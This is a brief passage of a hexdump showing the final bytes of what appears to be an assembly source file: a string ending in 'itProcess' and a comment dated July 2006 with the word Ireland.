00001230  69 74 50 72 6f 63 65 73  73 27 2c 30 0d 0a 0d 0a  |itProcess',0....|
00001240  3b 20 4a 75 6c 79 20 32  30 30 36 20 2d 20 28 49  |; July 2006 - (I|
00001250  72 65 6c 61 6e 64 29                              |reland)|
00001257
